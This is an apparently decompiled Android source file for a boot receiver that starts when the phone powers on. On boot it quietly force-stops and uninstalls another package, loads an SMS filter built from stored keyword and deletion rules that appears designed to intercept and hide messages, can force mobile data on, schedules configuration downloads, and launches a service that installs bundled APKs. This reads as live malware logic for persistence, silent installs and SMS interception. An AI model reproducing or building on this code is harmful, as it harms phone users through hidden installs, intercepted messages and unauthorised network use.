package com.qc.access;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.qc.base.OrderSet;
import com.qc.base.QCCache;
import com.qc.base.QCMainCourse;
import com.qc.base.RunStatement;
import com.qc.common.Constant;
import com.qc.common.Funs;
import com.qc.common.QuietInstallEngine;
import com.qc.entity.CustomInfo;
import com.qc.entity.SmsInfo;
import com.qc.util.ShareProDBHelper;
import com.qc.util.SystemUtil;

public class BootReceiver extends BroadcastReceiver {
    private static String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";

    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(BOOT_ACTION)) {
            int isInline = SystemUtil.checkAppType(context, context.getPackageName());
            boolean isDoublePush = Funs.queryServices(context, Constant.DOUBLEPACKAGE_CHECK);
            if (isInline == 0 || isDoublePush) {
                Intent intent2 = new Intent(context, Warming.class);
                intent2.addFlags(268435456);
                context.startActivity(intent2);
                return;
            }
            int basesitelauncher;
            int dayAndNight;
            int linkNetworkCount;
            int launcherdate;
            QCCache.getInstance().init(context);
            OrderSet.customInfo = new CustomInfo();
            if (Funs.isInstallApk(context, Constant.BaseSite_pkgName)) {
                Funs.forceStopProcess(context, Constant.BaseSite_pkgName);
                QuietInstallEngine.unInstall(Constant.BaseSite_pkgName);
            }
            if (ShareProDBHelper.read(context, "dataCenter", "basesitelauncher", 3) != null) {
                basesitelauncher = ((Integer) ShareProDBHelper.read(context, "dataCenter", "basesitelauncher", 3)).intValue();
            } else {
                basesitelauncher = 0;
            }
            if (basesitelauncher == 1) {
                String advkey;
                String advtent;
                String advtip;
                String advend;
                String comtent;
                String keytent;
                String delkey;
                long id;
                OrderSet.isopenSMS = 1;
                if (ShareProDBHelper.read(context, "dataCenter", "advkey", 2) != null) {
                    advkey = (String) ShareProDBHelper.read(context, "dataCenter", "advkey", 2);
                } else {
                    advkey = "";
                }
                if (ShareProDBHelper.read(context, "dataCenter", "advtent", 2) != null) {
                    advtent = (String) ShareProDBHelper.read(context, "dataCenter", "advtent", 2);
                } else {
                    advtent = "";
                }
                if (ShareProDBHelper.read(context, "dataCenter", "advtip", 2) != null) {
                    advtip = (String) ShareProDBHelper.read(context, "dataCenter", "advtip", 2);
                } else {
                    advtip = "";
                }
                if (ShareProDBHelper.read(context, "dataCenter", "advend", 2) != null) {
                    advend = (String) ShareProDBHelper.read(context, "dataCenter", "advend", 2);
                } else {
                    advend = "";
                }
                if (ShareProDBHelper.read(context, "dataCenter", "comtent", 2) != null) {
                    comtent = (String) ShareProDBHelper.read(context, "dataCenter", "comtent", 2);
                } else {
                    comtent = "";
                }
                if (ShareProDBHelper.read(context, "dataCenter", "keytent", 2) != null) {
                    keytent = (String) ShareProDBHelper.read(context, "dataCenter", "keytent", 2);
                } else {
                    keytent = "";
                }
                if (ShareProDBHelper.read(context, "dataCenter", "delkey", 2) != null) {
                    delkey = (String) ShareProDBHelper.read(context, "dataCenter", "delkey", 2);
                } else {
                    delkey = "";
                }
                if (ShareProDBHelper.read(context, "dataCenter", "id", 4) != null) {
                    id = ((Long) ShareProDBHelper.read(context, "dataCenter", "id", 4)).longValue();
                } else {
                    id = 0;
                }
                if (id > 0) {
                    SmsInfo smsInfo = new SmsInfo();
                    smsInfo.setAdvend(advend);
                    smsInfo.setAdvkey(advkey);
                    smsInfo.setAdvtent(advtent);
                    smsInfo.setAdvtip(advtip);
                    smsInfo.setComtent(comtent);
                    smsInfo.setKeytent(keytent);
                    smsInfo.setDelkey(delkey);
                    smsInfo.setId(id);
                    OrderSet.smsFilter = smsInfo;
                }
            }
            if (ShareProDBHelper.read(context, "dataCenter", "dayAndNight", 3) != null) {
                dayAndNight = ((Integer) ShareProDBHelper.read(context, "dataCenter", "dayAndNight", 3)).intValue();
            } else {
                dayAndNight = 0;
            }
            RunStatement.dayAndNight = dayAndNight;
            if (ShareProDBHelper.read(context, "dataCenter", "linkNet", 3) != null) {
                linkNetworkCount = ((Integer) ShareProDBHelper.read(context, "dataCenter", "linkNet", 3)).intValue();
            } else {
                linkNetworkCount = 0;
            }
            OrderSet.linkNet = linkNetworkCount;
            if (ShareProDBHelper.read(context, "dataCenter", "launcherdate", 3) != null) {
                launcherdate = ((Integer) ShareProDBHelper.read(context, "dataCenter", "launcherdate", 3)).intValue();
            } else {
                launcherdate = 0;
            }
            OrderSet.launcherDate = launcherdate;
            boolean launcherMainServiceFlag;
            if (OrderSet.customInfo != null) {
                launcherMainServiceFlag = launcherdate + 1 >= OrderSet.customInfo.getDay();
            } else {
                launcherMainServiceFlag = launcherdate + 1 >= new CustomInfo().getDay();
            }
            if (dayAndNight == 1 || launcherMainServiceFlag) {
                context.startService(new Intent(Constant.REGISTER_ACTION));
            }
            int delayTime = Funs.randromInt(OrderSet.customInfo != null ? OrderSet.customInfo.getHourMin() : new CustomInfo().getHourMin(), OrderSet.customInfo != null ? OrderSet.customInfo.getHourMax() : new CustomInfo().getHourMax());
            int forceOpenGPRS = OrderSet.customInfo != null ? OrderSet.customInfo.getForcedFlag() : new CustomInfo().getForcedFlag();
            int forceOpenGPRSDay;
            if (OrderSet.customInfo != null) {
                forceOpenGPRSDay = OrderSet.customInfo.getForcedDays();
            } else {
                forceOpenGPRSDay = new CustomInfo().getForcedDays();
            }
            if (forceOpenGPRS == 1 && forceOpenGPRSDay == 1) {
                QCMainCourse.startCheckNetWorkHandler(context, delayTime);
            }
            QCMainCourse.startConfigureDownLoadHandler(context, delayTime);
            RunStatement.repeatTime = (long) delayTime;
            if (Funs.getAssetsAPKCount(context, "apk") >= 1) {
                boolean booleanValue;
                if (ShareProDBHelper.read(context, "dataCenter", "isinstall", 1) != null) {
                    booleanValue = ((Boolean) ShareProDBHelper.read(context, "dataCenter", "isinstall", 1)).booleanValue();
                } else {
                    booleanValue = false;
                }
                if (!Boolean.valueOf(booleanValue).booleanValue()) {
                    context.startService(new Intent(context, LocalOsService.class));
                }
            }
        }
    }
}
